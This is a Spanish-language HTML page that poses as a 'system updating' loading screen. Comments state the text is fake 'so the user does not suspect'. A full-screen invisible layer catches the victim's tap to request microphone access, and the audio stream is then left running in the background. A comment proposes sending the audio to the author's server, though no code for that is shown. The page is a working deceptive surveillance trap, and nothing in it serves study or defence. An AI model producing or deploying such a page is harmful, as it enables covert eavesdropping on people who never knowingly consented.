<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body { margin: 0; padding: 0; background-color: #f0f0f0; font-family: sans-serif; }
        /* Botón invisible pero funcional */
        #trigger {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer;
        }
        .loading { text-align: center; margin-top: 45%; color: #666; font-size: 14px; }
    </style>
</head>
<body>

    <!-- Texto falso para que no sospeche -->
    <div class="loading">Actualizando sistema... Por favor espera.</div>
    
    <!-- Esta capa invisible captura el toque del usuario -->
    <div id="trigger"></div>

    <script>
        document.getElementById('trigger').addEventListener('click', function() {
            // Ocultamos el texto de carga
            document.querySelector('.loading').style.display = 'none';
            
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    const audioTrack = stream.getAudioTracks()[0];
                    console.log("Micrófono activo");
                    
                    // Aquí podrías agregar lógica para enviar el audio a tu servidor
                    // Por ahora, solo lo dejamos corriendo en segundo plano
                    
                    // Opcional: Quitar el listener para que no siga escuchando toques
                    this.removeEventListener('click', arguments.callee);
                })
                .catch(err => console.error("Error:", err));
        });
    </script>

</body>
</html>
